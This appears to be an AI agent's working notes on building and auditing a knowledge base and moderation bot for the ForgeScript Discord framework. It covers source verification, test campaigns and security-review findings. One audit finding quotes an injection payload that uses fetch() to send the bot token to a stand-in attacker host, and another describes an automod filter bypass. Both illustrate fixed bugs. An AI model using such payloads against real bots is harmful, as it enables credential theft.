# Meta-lessons — what I learned building and maintaining this knowledge base

Operational wisdom about the *sources*, so future-me doesn't relearn it the hard way.

## The docs site is a thin shell; the API is the real interface

docs.botforge.org is a JS SPA behind Cloudflare — `curl` gets a 403, and even successful fetches return empty "Loading..." shells. Everything useful flows through two channels:

1. **`api.botforge.org`** (JSON API) — but the anonymous tier is **5 requests/minute**, shared across ALL `/v1/` endpoints (guides list, guide content, validate, discord resources all draw from the same bucket). Planning: batch what you can, sleep ~12.5s between calls, expect 429s and retry with backoff. A full guide sweep is ~20 minutes at that pace.
2. **`raw.githubusercontent.com/<owner>/<repo>/refs/heads/main/metadata/*.json`** — the *same* metadata the site renders, with no meaningful rate limit. For bulk data this is always the right door. The registry (`/v1/extensions`) exposes these URLs per package — one API call unlocks everything else.

Lesson: get the registry once via the API, then live on raw GitHub; spend the API budget only on things that exist solely server-side (guide contents, validate).

## The docs metadata is not the whole truth

- `experimental`/`deprecated` exist in source but not in metadata — 25 + 5 functions the site never flags (see `experimental-map.md`).
- `output: Unknown` is common — the site shows nothing useful; the `execute()` body is the only real documentation.
- ForgeDB's metadata still carries removed/legacy functions under category `old` — changelogs contradict the function list, and changelogs win.

Lesson: **source > metadata > docs site.** The harvest step (`_tools/harvest_sources.py`) exists precisely because of this ordering.

## The validator lies in both directions

Tested live (2026-09-26, see `../knowledge/validate/README.md`): no unknown-function detection, no type checking, and false-positive cascades after `$!#` and `$@[sep]` prefixes. A clean report means "brackets and arg counts parse" — nothing more.

Lesson: use it as a *syntax* linter, never as a correctness proof; and when debugging someone's "validated" code, re-check everything it can't see.

## Things I got wrong before verifying (the humility list)

Writing the first drafts from memory, I produced errors that only source-checking caught:

1. `$suppressErrors` — doesn't exist (aoi.js reflex). Real tools: `$#fn`, `$try[code;catch;errVar]`.
2. `$interactionReply[msg;;;true;false]` — that's aoi.js shape. Real: `[content*;return message ID]`, with `$ephemeral` as a bare flag.
3. `$cooldown[10m;message]` — real signature is `[id*;duration*;code]` (and it's experimental).
4. `$defer[true]` — no args, bare `$defer`.
5. `$env[authorID]` as "context data" — `$env[key]` is just the env reader; context comes from dedicated functions.
6. aoi-flavored names that don't exist here: `$giveRole`/`$takeRole` (→ `$memberAddRoles`/`$memberRemoveRoles`), `$argsCount` (→ `$argCount`), `$channelSendMessage` (→ alias of `$sendMessage`, this one's real).

Lesson: this ecosystem has *sibling languages* (aoi.js especially) whose idioms leak into every discussion of it. Before asserting any function's signature from memory: check `../knowledge/functions/_INDEX.md` or the package index — the check takes seconds.

## Refresh discipline

- `bash ../knowledge/_tools/refresh.sh` — full refresh (guides cost ~20 min due to rate limits); `--skip-guides` for fast metadata+source only. Clones now pull, not just clone-once.
- After a refresh, re-check the experimental list first (that's where semantics drift), then deprecated (things being removed), then changelogs (behavior changes worth updating wisdom for).
- Raw caches live in `../.knowledge-cache/` — regenerating never needs the network except the two sources above; deleting the cache forces a re-fetch.
- `knowledge/` is generated — never hand-edit it (edits die on the next refresh). `wisdom/` is hand-written — the generator must never touch it.

## Real-code audit #1 (2026-09-26): the advanced-timeout system

First submission under the `code/` intake loop, and it immediately exposed a **structural knowledge gap**: the entire custom-function authoring layer (`module.exports = [{name, params, code}]`, `client.functions.load()`, param→env mechanics, `$fn`/`$callFn`, `$escapeCode` freeze) was absent from `knowledge/` because the docs site indexes only native functions. Filled via `../knowledge/core/custom-functions.md` (source-verified).

Other takeaways now baked into wisdom:
- Six "unknown" functions in real code were all **aliases** — always check the alias map before declaring something missing.
- Real code is the only source for *composition* semantics: `$loop`'s `asc` direction default, `$env` rest-path access, `$arrayMap`'s 4th output arg, `$onlyForUsers`' code-first signature.
- Production constraints surface as magic numbers (`maxRows=4` = Discord's 5-action-row cap minus nav) — the *why* lives in Discord platform limits, not ForgeScript docs. Record those derivations, not just the numbers.

Lesson: every real codebase submitted is a knowledge-gap detector first, a pattern source second. Audit for "what layer is this using that I haven't documented?" before auditing individual functions.

## Tools-surface audit (2026-09-26): `?tab=tools` and tools.botforge.org

User prompted a gap I'd skipped. Findings:

- `tools.botforge.org` sits behind a **Cloudflare interactive challenge** — `curl` gets a 403 "Just a moment..." page, but the **webfetch pipeline passes**. Rule: for any new botforge.org subdomain, try webfetch before concluding it's inaccessible.
- The calculators (intents/permissions/invite) are backed by **`/v1/discord`** — a directly usable JSON endpoint (21 intents with py/go aliases, 52 grouped permissions, 29 OAuth2 scopes, 14 gateway events, and a `calculate` bitwise decoder accepting numeric strings only). Documented in `../knowledge/tools/README.md`.
- The Client Generator page doubles as **undocumented documentation**: it enumerates the full ForgeClient options surface (trackers, `respondOnEdit` window, log levels, per-extension configs like ForgeDB's five DB backends). Tool UIs are sometimes the best spec for their library — scrape them for option inventories.
- The Analyzer is deprecated server-side; `/v1/validate` is its successor — consistent with the validator's narrow (syntax-only) scope.

Lesson: "docs" isn't just the function pages — tool pages, generators, and their HTTP backends are part of the knowledge surface, and some of it (like `/v1/discord`) is agent-usable directly.

Follow-up (same day): the `?tab=changelog` surface is also just the per-package metadata `changelogs.json` (6 packages ship one) — but combining it with the `version` ("since") field on every function/event yields something the site doesn't offer: per-version pages of exactly which functions/events were born in each release (`../knowledge/changelog/`). Every SPA tab has so far decomposed into data I can derive — and usually exceed.

## Real-code audit #2 (2026-09-26): the ID-search command

Second submission (prefix + slash + interaction handler). Outcome: **all 69 functions verified, zero gaps** — the audit-#1 lesson (check alias map, check for undocumented layers) has become cheap. The value this time was composition semantics:

- `$ifx` is a **chain assembler**: it scans its block for sibling `$if`/`$elseIf`/`$else` functions and runs them as one chain. Not documented anywhere; only readable in source.
- `data:` is the canonical slash-command format on `main` (`IApplicationCommandData` requires it); the GitHub README's `type: "slash"` style is legacy. Fixed `../knowledge/core/bot-setup.md` accordingly — the README would have misled me into documenting a dead format as current.
- `$option[name]` returns the attachment URL for attachment options (`data?.attachment?.url ?? data?.value`).
- `$message` is 0-based over user args (command name stripped upstream). Corrected my curated example wording.
- The Components V2 container family is the real-world output style for rich UIs — classic embed functions are legacy-leaning.

Lesson: after the first audit, individual functions stop being the risk — **upstream's own README drift** is. Cross-check the official README against manager/structures source before trusting its examples.

## Real-code audit #3 (2026-09-26): autocomplete tutorial

First tutorial-format submission (not a full system). **Zero contradictions found** — every function, field, and claim verified. Notable outcomes:

- `$arrayMap`'s filter semantics exist **only in source**: only `$return` values are collected (JSON-parsed), 4th arg redirects output to an env var (input=output = in-place filter). Metadata shows the signature; the behavior is invisible without reading `execute()`. This keeps proving that generated docs need the reference implementation section.
- `$includes` was an alias (`$checkContains`) — third audit in a row where an "unknown" function was an alias. The alias map is now my first stop, reflexively.
- Event-file fields keep accumulating across audits: `{ type, allowedInteractionTypes, code }` — command-file shape knowledge now covers name/aliases/usage/description/category/data/type/allowedInteractionTypes.
- Tutorials (vs. real bot code) verify cleaner but teach composition less — best used as spec-checks for specific features.

Lesson: tutorials are cheap, high-yield verification targets — and each one so far has validated at least one alias and one source-only semantic.

## Real-code audit #4 (2026-09-26): custom functions tutorial

First audit that found a bug in **my own documentation**. I had written `knowledge/core/custom-functions.md` after reading `ForgeFunction.ts` — but conflated the two invocation paths: `$callFunction` (client ForgeFunction registry) and `$callFn`/`$callLocalFunction` (context-local `$fn` definitions) are *separate functions with separate registries*, and direct invocation (`$myFunc[...]`) is a third, primary path (registration promotes definitions into the global FunctionManager). Fixed the core doc; recorded the trap in `custom-functions-two-systems.md`.

Lesson: my source-reading can still miss the **plurality** of similar mechanisms — one file read (`ForgeFunction.ts`) doesn't reveal that a *sibling* function (`$callFunction` vs `$callLocalFunction`) serves a different registry. When two names look related, read both and diff their `execute()` targets before documenting either.

## Real-code audit #5 (2026-09-26): official migration post

The migration post validated cleanly (action rows, response-containers, 0-based indexes all source-verified) — but auditing it against **my own wisdom** caught two self-bugs:

1. My moderation recipe used `$mentioned[1]` for the first mention — **wrong in a 0-based language**, written *after* I had already documented `$message` as 0-based. Knowing the rule didn't stop me from violating it by reflex (1-based muscle memory from aoi-style examples). Fixed; added the migration grep checklist (`[1]` = suspect).
2. I had mentally filed `$textSplit`/`$splitText` as "aoi-only, doesn't exist" — they DO exist as compat functions (array category). My early name-check even printed them in a missing list and I never re-examined. The lesson from audit #1 (check the alias map) extends to: **check the actual metadata before declaring absence, every time** — early exploratory outputs fossilize into beliefs if not corrected.

Also newly consolidated: everything learned across audits about sibling-language differences now lives in `migration-map.md` as a single cheat sheet instead of scattered mentions.

Lesson: audits must include **my own prior outputs as audit targets** — error lists, recipes, and early exploration notes all rot as understanding improves.

## Real-code audit #6 (2026-09-26): amc — a deployed production bot

The deepest audit: a whole deployed music bot (TS-first, **ForgeScript 2.7.1 pinned from npm**). Outcome: **221/262 function tokens verified, zero contradictions** — the pinned release matches my `main`-based docs across every surface the bot touches. New lessons:

- **Unknown `$fn` ≠ typo — it may be an undiscovered package.** The cache functions resolved to `@nationdex/edge`, a 28-function extension with *zero presence in the docs-registry API*. Registry exhaustiveness was an implicit assumption; it's now explicitly false. Edge is harvested and documented (`knowledge/extensions/edge/`); future refreshes keep it via the manual registry entry.
- **Token-grep artifacts**: `$guildID_channelid`-style strings are `$guildID` + literal key text — audit tooling must account for function-name prefixes inside string contexts before declaring unknowns.
- Production confirms mechanics source said but nothing had exercised: `$loop[-1]` infinite loops, params-declared-after-code in `$localFunction`, case-insensitive call reliance, `[\]` empty-JSON-array literals, `$async[$callFunction[...]]` backgrounding.
- The hybrid architecture pattern (custom functions as TS bridges over Node libraries, command code stays pure ForgeScript) is the scaling answer when scripts hit their ceiling.

Lesson: whole-repo audits scale the same as file audits — extract every function token, diff, decompose the remainder (concatenation / case variants / custom defs / unknown packages) before concluding anything.

**Full-comb addendum (user-prompted):** the token sweep was exhaustive but line-reading wasn't — and the full comb **found a bug the sweep missed**: my curated `$httpRequest` example carried an aoi-style 5-arg shape; real signature is `[url*; method*; variable?]` with the response stored in an env variable. Token-existence checking ≠ usage-shape checking. For future repo audits: sweep tokens first (cheap), then comb the files that use *unfamiliar argument shapes* — grep for multi-`;` calls of HTTP/interaction/timer families, since those are where sibling-language muscle memory corrupts my examples. Also corrected mid-note: `$jsonEntries` is `Object.entries` order ([key, value]), not value-first.

## Real-code audit #7 (2026-09-26): botforge-starter-kit

Smallest audit, biggest doc catch: my **event-page registration examples were wrong** — event/command files require `type` (`IBaseCommand.type`, `MissingCommandType` on absence); `name` is the optional trigger. Two production repos agreed; my example had inherited the README's legacy shape. Third README-drift surface confirmed (slash `data:`, command `type:`, name-only events). Also learned: prefixes are compiled and resolved **per message** (DB-backed prefixes update live), command name matching is case-insensitive by default, and `prefixMode`/`unprefixed` exist.

Lesson: **starter kits are the highest-value-per-line audits** — they exercise the canonical minimal patterns that my docs' own examples teach, so any drift there multiplies through every user who copies it. Audit small canonical repos before large exotic ones.

## Real-code audit #8 (2026-09-26): ForgeScriptBot — maintainer canon

The lead developer's own docs-bot (`#dev` branch). Zero contradictions with my docs — and one semantic mine had missed entirely: **`$httpRequest` returns the HTTP status code** (body → env var). Curated example updated. Also validated: my source-harvested experimental/deprecated flags agree *perfectly* with sparse metadata flags (25+5 both sources) — an independent crosscheck of the extraction pipeline. Class-instance exports (`new BaseCommand/ForgeFunction/ApplicationCommand`) are maintainer style, now in the custom-functions doc.

Lesson: **maintainer-authored repos outrank everything** — including my source readings — for style canon (they show intended use, not just possible use), while source remains authoritative for mechanics. When both exist, audit style against the maintainer and mechanics against the source.

## Real-code audit #9 (2026-09-27): full-corpus study pass — my own examples under the microscope

User-mandated session: re-read the entire KB (wisdom 100%, knowledge core + indexes), then audit it as an *object* the way audits #1–8 audited submissions. The #5 lesson ("my own outputs are audit targets") applied at scale. Findings, all fixed same day:

1. **`$reply` fossil (2 files).** Both `knowledge/core/bot-setup.md` and `study/00-kindergarten.md` taught `$reply[Pong! ...;no]` — aoi's shape. Real signature: `[channel ID*; message ID*; disable ping]`; production uses `$reply[$channelID;$messageID;true]` (amc) and bare `$reply` (timeout system). "Pong!..." as arg 1 fails the Channel gate outright. I documented 0-based indexing *and* kept a 1-shaped reflex in the very next file — the fossil class reproduces wherever an example was written from sibling-language muscle memory rather than from the page.
2. **Button-style fossil (4 files).** `$addButton[id;label;success;false;]` in recipes/idioms/lesson-03/exam P2: lowercase style fails the `ButtonStyle` enum gate (keys are PascalCase — production code uses `Primary`/`Danger`), and the `false` sat in the *emoji* slot. Correct: `$addButton[id;Label;Style]` 3-arg form. Rule sharpened: **enum args are exact keys — check the enum page, always, even when the shape "looks standard."**
3. **Dead select menu (1 file).** The poll recipe built `$addStringSelectMenu` with zero `$addOption`s — Discord rejects an option-less select. `$addOption[name*;description;value*;emoji;default]` now in the recipe.
4. **Name hallucinations in my own security/idiom notes.** `$webhookExecute` (real: `$webhookSend`), `$interactionData` (real: `$interactionRawData` — `$customID`/`$isButton` are what filters actually use). Both were *my prose*, never verified. New reflex baked into quick-reference: existence-check every function name I write (`find knowledge -name '$name.md'` loop) — it caught 6 bad names in one pass, including two in long-standing wisdom files.
5. **Stat drift.** `knowledge/README.md` said "+188 alias files"; the tree has **388** alias stubs (1120 canonical + 388 = 1508 — matches build_stats.json). Root-maintained file, fixed in place. Re-counted and confirmed the other headline numbers (46 categories, 79 events, 96 enums, 96 guides, 25 experimental + 5 deprecated — all accurate).

**Systemic finding — the generated pages' Examples sections can lie.** The `$reply` page's own examples (`$reply[Hello!;no]`, `$reply[Hi!;yes]`) contradict its signature table *and* its verbatim `execute()` source; the `$addButton` page's example uses lowercase `danger`, `false`-in-emoji-slot, and `:warning:`-in-disabled. The generator's auto-authored examples inherit aoi conventions. Within any function page, trust order: **Reference implementation > Signature/params table > Examples.** This is now stated in `quick-reference.md`'s lookup table. (The generator itself is untouched — fixing example curation is a generator change for the next refresh cycle, tracked here so it isn't forgotten.)

Additions this session: `quick-reference.md` (one-page operational cheat sheet), `task-to-function-map.md` (reverse task→function index) — every signature in both re-verified against pages this date. Ledger updated (`study/ledger.md`).

Lesson: a "read everything and improve it" pass is a distinct audit class — not a code submission (no new upstream truth) but a *self-consistency sweep*. It found 8 defects across 7 files that per-submission audits missed, because each individual file was verified against *source* but never against *its own examples' argument shapes*. Add to the standing checklist: after writing any example, re-derive each argument position from the function page before shipping.

## Chronolith build campaign (2026-09-28): shipping a real bot on the KB

Built a full moderation bot (Wick/Carl/Dyno-tier scope) end-to-end on ForgeScript, then tested it conventionally (static/compile), unconventionally (synthetic-gateway fabrication), and adversarially (exploit review + a second real bot account driving live E2E). The KB held up — and grew. New lessons, all empirically verified:

1. **`$and[...]`/`$or[...]` take `;`-separated conditions — commas are literal text.** `$and[$get[s]>=0,$get[s]<=100]` is ONE condition string and fails closed. I wrote commas by reflex in a dozen places; only live testing caught them (compile passes, the condition just evaluates false).
2. **Top-level `$jsonSet` leaks `true` into the output** — negate (`$!jsonSet`) any value-returning db call at top level, or the reply arrives with stray `true`s.
3. **A custom function's `$return`, when the call sits at TOP level, ends the enclosing command** — `$lockChan[...]` alone output "ok" and the following embed never rendered. Capture in `$let[r;$fn[...]]` first.
4. **Channel-permission semantics are three functions, not sign-prefixes**: `addChannelPerms` = ALLOW (enum keys), `removeChannelPerms` = DENY (`obj[x]=false`), `deleteChannelPerms` = INHERIT (null). My task-map's `-SendMessages` deny syntax was a fossil — fixed there too.
5. **`$guildIDs` default separator is `", "`** — splitting on `,` yields leading-space IDs that silently miss every cache lookup. Pass the separator explicitly.
6. **`$messageContent` 404s for fabricated/deleted messages and the error POSTS to the channel** — silence risky fetches (`$#messageContent`) and early-return.
7. **No native bulk history fetch exists** — filtered purges need a scoped `$djsEval` bridge (the amc pattern). Keep eval inputs internally generated (IDs/counts), never user text.
8. **Embed/content stripping**: without the MessageContent intent, a bot receives OTHER bots' messages with gutted embeds over the gateway (REST shows them intact). Test harnesses must poll REST or hold the intent.
9. **`applicationCommands.load()` turns subfolders into subcommand groups** — flat slash folder or you ship `/mod ban` instead of `/ban`.
10. **Custom functions compile LAZILY (first call)** — a load-time validator proves nothing about their bodies. Force-compile via `Compiler.compile(def.code)` in the harness.
11. **ForgeDB sqlite schema**: table `record(identifier, name, id, type, value, guildId)`, identifier `guild_<name>_<guildId>`, guildId column empty in its own writes — seed configs accordingly.
12. **Bare `$var` (no brackets) is passed through as literal text** — `$total` instead of `$get[total]` compiles clean and prints "$total" at runtime. The compiler cannot catch this; only a name-aware checker can.
13. **JS template literals eat single backslashes** (`\[` cooks to `[`) — escapes destined for ForgeScript need doubling, and the bracket-neutral-in-pairs behavior of literal `[...]` in args makes paired brackets safe but unpaired ones fatal. Also: ripgrep `--replace` is display-only (a false-alarm corruption scare worth remembering), and `rg -rln` is NOT "recursive list names".
14. **`allowBots: true` + canRespondToBots** lets a second bot account act as a test user — the only way to E2E non-mod paths without a human.
15. **Server-owner vs bot-owner**: `$guildOwnerID` is the untouchable one for moderation guards; `$botOwnerID` protects the application owner. Test with the right one — application ID ≠ owner user ID.

Lesson: building a real product on the KB stress-tested assumptions the audits never touched — output-leak semantics, eval-bridge necessity, intent-based embed stripping, and loader quirks. Live E2E with a second account found 4 bugs that fabrication-based testing could not (it fabricates one author; the actor-bot revealed permission/hierarchy realities).

## Live E2E campaign II (2026-09-28, later): the data-layer bugs composition testing finds

Second wave, after shipping the plan + Phase 1 features. Every item below was isolated by a live probe against the running bot — none were visible to the compiler, the arity auditor, or code review. The one-liner: **composition bugs live in the seams between components**, and only end-to-end execution exercises seams.

1. **`$jsonSet` runs `parseJSON` on the value** (`jsonSet.js`: `parseJSON(keys[last])`). A bare snowflake parses as a JSON number and silently loses precision past 2^53 (`1553806204885798952` → `...799000`). Every ID that ever enters a JSON structure must be **quote-wrapped**: `$jsonSet[c;u;"$env[target]"]` — the quotes survive resolution, parseJSON returns the string intact. Verified live: the roundtrip preserves all 19 chars. This single quirk corrupted modlog channels, report records, case files, and protect lists in ways that *looked* like five different bugs.
2. **Consecutive dynamic keys in `$jsonSet` silently no-op.** `$jsonSet[cfg;$get[k1];$get[k2];v]` writes nothing — one dynamic key works, two in a row fail (p2/p3 probes). Registry shapes must be flattened: scalar values under dynamic *variable names* (`ms_<uid>`, `tb_<uid>`, `lkd_<ch>` + a CSV index var), literal keys inside each record. Nested-object registries are unmaintainable in-language.
3. **A duplicated `$cooldown` kills its own command silently.** The multi-target template embedded the full gate, and the file emitter prepended it again — the second `$cooldown` in the same execution saw the first's just-armed 3s timer and stopped with no output. Symptom: `$warn` (single gate) worked while every multi-target command was silent. General rule: **generators own the gate; spec bodies must never include it** — and a command that dies with zero output and zero errors goes to the "duplicated early-exit" suspect list right after cooldowns.
4. **Custom-fn param order must be grep-verified at every call site.** `$newCase[guild;type;...]` was called as `$newCase[type;guild;...]` in all eleven punish paths — cases recorded fine (fields aligned by luck), but user-indexes and mod-stats wrote to garbage keys, so `%warnings` said "No cases" while the modlog showed the cases landing. Data writes that "work" can still be cross-wired.
5. **A single broken .js file poisons the whole loader.** My probe folder had one syntax-error file; every subsequent probe run silently loaded zero commands, and I spent a full bisect cycle "debugging" a bot that wasn't running my code. `node --check <file>` on every file in a loader directory before trusting any test result from it.
6. **Fabricated messages need real role arrays.** The synthetic gateway fabricates a `member` object; permission resolution reads it (`roles: []` = no perms, regardless of the real member's roles). Fabricate with the author's actual role IDs or every gated command rejects.
7. **`$sendDM` to a bot fails `50007`** ("Cannot send messages to this user") — expected in bot-to-bot test setups; per-call silencing works, the console noise is cosmetic.
8. **Harness pacing must respect command cooldowns** (≥3.6s between invocations of the same command) and reply-matching should poll REST with a generous window — server timestamps skew from local clocks, and gateway embeds arrive gutted without the MessageContent intent (campaign I #8).
9. **Administrator is not ManageGuild in `$hasPerms` land.** A bot holding only the auto-created bot role (perm 8) fails `$hasPerms[...;ManageGuild]` — the check appears bitwise on explicit grants. For test setups, assign a role with explicit permission bits.
10. **When N features all break at once, suspect the one thing they share.** The multi-target family (kick/ban/mute/hardban/softban) failing together while warn worked was the doubled-gate signature; cases recording but not listing was the arg-order signature. Debug the *shared* path first, not the individual commands.

Lesson: this wave found nothing wrong with any single function — every bug was in how outputs flow into inputs (JSON coercion, param order, registry shape, gate composition). The test pyramid needs a live-E2E layer precisely because static layers validate components, and components that each pass can still compose into silence.

## Multi-agent codebase audit (2026-09-28, final): the engine-level bugs that only adversarial review finds

Three parallel sub-agents (engine deep-audit, events+security, generator+commands) were dispatched to audit the entire Chronolith codebase. Each ran independently, found overlapping AND unique bugs, and the results were synthesized before fixing. This is the record of what only multi-perspective adversarial review catches.

### The $parseMS inversion (found by: engine agent)

`$parseMS` converts **ms → human-readable string** ("1 minute"), NOT duration text → ms ("10m" → 600000). I had used it as text→ms in six places (mute clamping, hardban expiry, tempban scheduling, timed lock). Every timed moderation silently died — the command ran, hit `$parseMS[10m]`, the arg-type gate rejected the string, and the entire execution aborted with zero output. **The runtime source** (`parseMS.js:16` — `TimeParser.parseToString`) is the truth; the docs page's parameter table says "Number" but the bots' usage context made it look like a parser. Created a `$durationToMs` custom function (regex-based `(\d+[smhdw])` scanner in djsEval) as the gap-filler. Lesson: **parameter TYPE is the contract — a Number-typed param never accepts text, no matter what the function name suggests.**

### The $arrayIncludes number-coercion (found by: engine agent + security agent)

`$arrayIncludes[var;needle]` runs `parseJSON` on the **needle** but not the array. A digit-string needle (snowflake ID) becomes a `Number` and **never matches** a string array. This silently killed:
- `%modrole` (isMod checked modrole IDs against member role IDs — always false)
- `%protect` (protected user/role checks — always false)
- lockdown channel dedup (already-locked channels re-registered with duplicates)

The fix: replace with `$arraySome[arr;x;$checkCondition[$env[x]==needle]]` — string comparison via condition fields, no coercion. Lesson: **any $arrayIncludes call with numeric-string data is a latent bug.** Check KB source (`arrayIncludes.js:37` — `parseJSON(value)`) for coercion behavior before using it with IDs.

### The _fix_seps off-by-one (found by: generator agent, debugged interactively)

The comma→semicolon fixer for `$and`/`$or` conditions tracked bracket nesting incorrectly: it checked `if nest == 0: break` BEFORE decrementing, meaning the scanner went exactly ONE bracket too far. This converted commas in error-message text (outside the $or) into semicolons, splitting `$onlyIf`'s arguments. The fix: decrement nest first, THEN check for zero. This was a **pure tooling bug** (in the Python generator, not in ForgeScript), but it corrupted every generated command that had commas in usage/error text near an $or/$and. Lesson: **nesting counters must close the current scope before checking for scope exit.**

### The djsEval injection (found by: security agent — CRITICAL)

`%cleanup` passed `$message[0]` (raw user text) into `$scanMessages[channel;limit]`, and `scan.js` interpolated `$env[limit]` directly into a `eval()` body. A moderator could type `c!cleanup 1?fetch("https://attacker.com/?t="+process.env.BOT_TOKEN):0` — valid JS, fires the request, exfiltrates the bot token. Fixed by `parseInt(String(...).replace(/[^0-9]/g,""))` inside the eval body. Lesson: **any djsEval body that interpolates user-reachable values is an injection surface, regardless of how "validated" the callers claim to be.** The comment in scan.js said "internally generated only" — the comment was wrong.

### The automod prefix-immunity bypass (found by: security agent)

The automod handler skipped ALL filters for any message starting with a known command prefix (`c!`, `c?`, `%`) AND containing a known command name — including public commands like `ping`, `help`, `report`. Any non-mod user could post `c!ping free nitro discord.gg/scam` and bypass every filter. The intent was to prevent automod from flagging bot responses to commands; the implementation accidentally gave command-prefix users immunity from the automod itself. Fixed by removing the skip entirely (mods are already exempted earlier in the handler). Lesson: **security exemptions based on message content patterns are bypass vectors.** Exempt by IDENTITY (is the user a mod?), not by content (does it look like a command?).

### Other findings from the synthesis

- **Empty-whitelist link filter was inverted**: `$arrayLoad[wlc;,;""]` → `[""]` → `$checkContains[msg;//""]` → every URL contains `//` → `allowed=1` → nothing flagged. The correct semantics: empty whitelist = block all links.
- **`warnsRemove` wiped the entire user case index** including non-warn cases (ban/kick records). The code iterated cases removing warn-types but then blanked the whole `ulist_` var instead of rebuilding it with the survivors.
- **`reportUpdate` set `closedBy`/`closedTs` on CLAIM**, not just on resolve/dismiss. Claimed (still-open) reports carried fabricated closure metadata.
- **Orphan command files from pre-plan iterations** (delwarn, tempban, warnings, setnick) conflicted with the new command aliases, causing double-execution with different behaviors.
- **Six log handlers** (channel/role create/delete/update) sent empty messages with no title or embed — guaranteed API 50006 on every event.
- **Race conditions**: every counter in the codebase uses non-atomic read-modify-write on guild variables. Two concurrent events can lose updates (anti-nuke counter, flood counter, case-number duplication). No fix applied yet — this is the known architecture limitation.
- **Unquoted snowflakes in event handlers** (snipeDelete, snipeEdit `$authorID`): the fix had been applied to `functions/` but not propagated to `events/`.

### Meta-lesson: the audit methodology

1. **Three agents, three perspectives** — engine internals, security surface, tooling/generation. Each found bugs the others missed. The overlap zone (arrayIncludes coercion, found by two agents independently) validated the approach.
2. **Runtime source verification** — the engine agent EXECUTED test code through the real installed engine to verify each finding empirically before reporting it. This eliminated false positives and proved real impact.
3. **Cross-referencing** — every finding was checked against all callers, callees, and the generated command files. A bug in `warnsRemove` was traced through to its impact on `%cases`, `%warnings`, `%modlog user`, and `warnCount`.
4. **The biggest bugs were in the seams** — the data-flow between components (parseMS's type contract, arrayIncludes's coercion, the generator's post-processing corrupting output text), not in the individual functions.

Lesson: **multi-agent adversarial review with runtime verification finds bugs that no single perspective catches.** The engine agent found parseMS; the security agent found the injection; the generator agent found the _fix_seps off-by-one. No single agent would have found all three.

## Three-agent knowledge mining expedition (2026-09-28, final): the deep truths

Three parallel sub-agents mined the entire KB, runtime source, and all eight audited repos. This is the consolidated record of everything NEW that wasn't in the KB before.

### Agent 1: Runtime internals (compiler, interpreter, types, returns, container)

The most important discovery: **the KB has 10 significant inaccuracies about the runtime.** All verified by live execution against the installed 2.7.1:

1. **Unknown functions are NOT compile errors** — they become plain literal text. The regex only matches registered names. Inner real functions inside unknown wrappers STILL EXECUTE.
2. **`$let`/`$get` use the KEYWORDS store, not the environment.** `$env` is a separate store (populated by custom-function params, `$jsonLoad`, `$try` error var, `$loop` counter). `$let[q;7]$env[q]` → EMPTY.
3. **`$#` (silent) at top level: suppresses the alert but still aborts the whole run** — nothing after it executes. On NESTED calls, `#` is completely IGNORED (only the top-level fn's flag is checked).
4. **`\$fn` (double backslash before function) loses the backslash and the function executes** — the SystemRegex callback ignores its own escape guard.
5. **Json and Color resolvers NEVER reject.** Invalid JSON returns the raw string. Garbage colors yield NaN (from parseInt).
6. **Empty-string required args coerce, not missing.** `$sum[;2]` → 2 (Number("")=0). Boolean empty → InvalidArgType. MissingArg only for absent fields.
7. **`$loop` discards plain body output** — only `$return` values accumulate.
8. **Time units: no `ms`, no decimals** (`1.5h` throws). `M`=month (30d) vs `m`=minute. `y`=360d.
9. **`unwrap:false` functions never enforce required args** — `$if[true]` (missing required arg) returns empty success.
10. **Custom functions share the caller's container** (clone spreads runtime — container is a reference). Embeds built inside custom functions ride the parent's send. Errors inside customs → parent silently stops (fn.stop()).

Additional findings:
- The condition parser only recognizes operators in **literal text** — operators from nested function outputs are never parsed as operators.
- Cooldown keys use the per-process integer command instance ID (not the name) — unstable across restarts, irrelevant (in-memory).
- Cooldown error sends **bypass doNotSend** and **reset the shared container** (embeds built before the check are destroyed).
- `$escapeCode` returns escape-processed raw text (backslashes already consumed) — freeze/thaw caveat.
- Custom function param → env uses `setEnvironmentKey(paramName, value)`. `$let` inside the body writes keywords. Both are readable from `$djsEval` via `ctx.getKeyword()` / `ctx.getEnvironmentKey()`.
- `$function` is the IIFE: it converts a Return into a Success. `$loop` appends `$return` values. `$while`/`$if` do NOT consume Return.

### Agent 2: Function catalog patterns (relationships, side effects, context requirements)

Key discoveries about inter-function relationships:

1. **Three hidden stores govern most ordering bugs:**
   - JSON "last-loaded" pointer: `$jsonSet`/`$jsonDelete` operate on the MOST RECENTLY `$jsonLoad`-ed JSON (no variable param)
   - `SplitTextName` instance: `$textSplit` writes to a hidden store that `$splitText`/`$splitTextJoin` read (separate from named arrays)
   - `ctx.http` staging: headers/body/form are consumed and CLEARED by each `$httpRequest`

2. **The response container accumulator is the largest coupling surface** (~83 functions, all order-sensitive):
   - Embed decorators → newest embed index
   - `$addActionRow` → newest row; buttons/menus attach to newest row
   - `$addStringSelectMenu` → newest select; `$addOption` attaches to newest select
   - `$ephemeral` → read at defer/reply time, not at call time
   - All flushed by any send; manual sends RESET the container

3. **All boolean-returning mutations swallow API errors** (`.catch(ctx.noop)` → `false`). `false` conflates "Discord rejected" with "exception thrown" — check with `$try` if the distinction matters.

4. **`$httpRequest` returns the HTTP STATUS CODE**, not the body. Body goes to env var. Staged options auto-clear.

5. **Guide co-occurrence confirms community idioms:** `$channelID`+`$sendMessage` (11/96 guides), `$let`+`$get` (5), `$addActionRow`+`$addButton` (4), timer set/clear pairs (2).

6. **Enum → consumer complete map extracted** (96 enums, all reverse-mapped to consuming functions) — critical for linter validation.

### Agent 3: Real-world code patterns (all 8 repos)

The most impactful new patterns:

1. **The `$async` + `$loop[-1]` + `$wait` join idiom** — ForgeScript's only concurrency mechanism:
```
$let[fsearch;false]
$async[ ... $let[fsearch;true] ]
$loop[-1]
  $if[$get[fsearch]!=false;$break]
  $wait[5]
```

2. **`$onlyIf` as a general control-flow primitive** — gate response can be `$return`, side-effect statements, or full interaction replies. Not just "send message and stop."

3. **The local-function retry wrapper pattern** — every network function wraps in `$localFunction[name; body; retry]` with try-counter, early-return past max, re-auth on 401/403.

4. **Three-state negative caching** — `undefined` (in-flight) → `null` (negative cache, never retry) → data. Set in-flight marker BEFORE fetching.

5. **`$jsonStringify[var]` as the eval-escaping bridge** — JSON-stringifying an FS env var produces a valid double-quoted JS string literal, the canonical injection-safe interpolation into `$djsEval`.

6. **Packed/sentinel return values** — `$return[0]` / `$return[1]` / `$return[3|data]` error codes; boolean + `|` + value tuples unpacked by `$advancedTextSplit[...;|;1]`.

7. **Autocomplete error-as-choice** — can't reply to autocomplete, so errors ship as `$addChoice[error-msg;__null__]` with a sentinel the command detects.

